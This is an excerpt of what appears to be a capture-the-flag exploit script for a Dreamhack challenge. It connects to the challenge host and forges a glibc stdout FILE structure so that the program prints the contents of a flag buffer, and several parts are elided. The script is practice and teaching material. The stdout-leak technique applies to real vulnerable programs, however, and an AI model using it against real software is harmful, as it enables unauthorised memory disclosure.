...
def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 10683)
...
def main():
    ...
    flag_buf = unwrap(exe.symbol("flag_buf"))

    payload = b""
    payload += ptr.p64(0xFBAD0000 | 0x0800)
    payload += ptr.p64(0)  # read_ptr
    payload += ptr.p64(flag_buf)  # read_end
    payload += ptr.p64(0)  # read_base
    payload += ptr.p64(flag_buf)  # write_base
    payload += ptr.p64(flag_buf + 1024)  # write_ptr
    payload += ptr.p64(0)  # write_end
    payload += ptr.p64(0)  # buf_base
    payload += ptr.p64(0)  # buf_end
    ...
    payload += ptr.p64(1)  # fileno -> stdout
